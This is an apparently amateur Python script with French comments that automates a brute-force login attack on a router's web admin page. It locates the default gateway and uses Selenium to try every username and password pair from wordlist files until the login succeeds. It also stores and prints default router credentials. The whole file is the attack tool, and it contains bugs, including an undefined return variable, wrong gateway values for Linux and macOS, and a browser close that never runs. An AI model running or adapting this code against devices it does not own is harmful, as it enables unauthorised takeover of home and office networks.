import os, platform, netifaces, requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
dic={'router':('adress or default_getaway' , 'username', 'default password')}
def file2dic():#actualise le dico
    global dic
    with open('router.txt') as file:
        #print(file)
        for line in file:
            line = line.strip()  # Remplacez replace("\n", "") par strip() pour supprimer les espaces blancs en debut et fin de ligne
            #print('')
            #print('###################################')
            #print('the line is ', line)
            line = line.split(';')
            word = line[0]
            #print('key is:', word)
            try:
                tup = (line[2], line[3], line[4])
            except: 
                tup = int(line[2])
            #print('the tup is ', tup)
            dic[word] = tup
            #print(dic[word])
            #print('###################################')

def print_tuple(key):
    a, b, c = dic[key]
    print('Le routeur:',key,'\n   default getaway: ',a,"\n   nom d'utilisateur: ",b, '\n   mot de passe: ',c)#imprime les tuples avec routeur default gateway et mdp 


def print_dic(): #imprime le dico
    global dic
    for i in dic:
        try:
            a, b, c=dic[i]
        except:
            a , b ,c = dic[i],'',''
        print('Le routeur:',i,'\n   default getaway: ',a,"\n   nom d'utilisateur: ",b, '\n   mot de passe: ',c)

def lookup_dic(key):#regarde si le routeur est dans le dico 
    if key in dic:
        if isinstance(dic[key], int):
            numb=int(dic[key])
            for i in range(numb):
                new_key = f"{key}{i}"
                print_tuple(new_key)
        else:
            print_tuple(key)
    else:
        print('erreur veuillez recommencer')


def get_default_gateway():#chat gpt pour recup le default gateway
    # Recuperer les informations de la passerelle par defaut
    gateways = netifaces.gateways()
    # Extraire l'adresse IP de la passerelle par defaut pour IPv4
    default_gateway = gateways.get('default', {}).get(netifaces.AF_INET, [None])[0]
    print(f"La passerelle par defaut est : {default_gateway}")
    return default_gateway

def find_default_getaway(logi):#choisi la methode selon l'os fait que pour windows
    match logi:
        case 'Linux':
            return 1
        case 'Darwin':
            return 2
        case 'Windows':
            return get_default_gateway()
        case _:
            return 0

def bruteforce(default_gateway):
    with open('user.txt') as user_list:#Lis les nom d'utilisateur de user.txt
        users = [user.strip() for user in user_list]

    with open('passwords.txt') as password_list:# Lis les mots de passe de passwords.txt
        passwords = [password.strip() for password in password_list]

    found = False#flag pour savoir si c'est trouve

    for user in users:#lance l'attaque brute force
        for password in passwords:
            if selenium_login(user, password, default_gateway):
                print(f'Le mot de passe est "{password}", et l\'utilisateur est "{user}"')
                found = True
                break
            else:
                print(f'Test echoue pour l\'utilisateur "{user}" mot de passe "{password}"')
        if found:
            break

    if not found:
        print("Aucune correspondance trouvee.")

def selenium_login(username, password, default_gateway):#jsp comment ca marche enierement de a a z mais bon mrc chat gpt
    # Initialiser le navigateur (ici, Chrome, mais vous pouvez utiliser un autre navigateur)
    driver = webdriver.Chrome()

    # Acceder à l'URL de la page de connexion
    driver.get("http://"+default_gateway)  # Remplacez par l'URL reelle

    # Trouver les champs de texte pour le nom d'utilisateur et le mot de passe
    username_field = driver.find_element(By.ID, "txt_Username")
    password_field = driver.find_element(By.ID, "txt_Password")

    # Remplir les champs
    username_field.send_keys(username)
    password_field.send_keys(password)

    # Trouver et cliquer sur le bouton de soumission
    login_button = driver.find_element(By.ID, "button")
    login_button.click()

    # Vous pouvez maintenant verifier la page resultante pour voir si la connexion a reussi
    if "incorrect" in driver.page_source.lower():
        print("Nom d'utilisateur ou mot de passe incorrect.")
        return False
    else:
        print("Connexion reussie.")
        return True

    # Fermer le navigateur
    driver.quit()
def __main__():
    user=''#utilisateur
    password=''#mot de passe
    default_gateway=''#nom explicit
    setup=False#flag pour voir si les logins sont remplies
    logi=platform.system()
    plat=os.name
    switch=True
    print_dic()
    file2dic()
    #print_dic()
    print('voici les diffrents routeurs disponibles:')
    for i in dic:
        print(i,end=' , ')
    while True:
        i=input('-tapez le nom de votre routeur pour voir les parametres courants:\n (tappez exit pour quitter)\n -taper setup pour manuelement entrer les informations \n -tapez brute force pour essayer de bruteforce le routeur\n -tapez connexion si vous avez deja entre setup\n')
        match i:
            case 'setup':
                default_gateway=str(input('entrez le default_gateway dans le format 255.255.255.255'))
                user=str(input('entrez le nom d\'utilisateur'))
                password=str(input('entrez le mot de passe'))
                settings=user,password,default_gateway
                if isinstance(user,(str,str,str)):
                    print('parametres pris en compte')
                    setup=True
                else:
                    print(i)
            case 'brute force':
                find_default_geteway=find_default_getaway(logi)
                bruteforce(find_default_geteway)

            case 'connexion':
                pass
            case 'exit':
                print('fin du programme')
                break
            case _:
                lookup_dic(i)
    return logi, plat, default_gateaway
__main__()
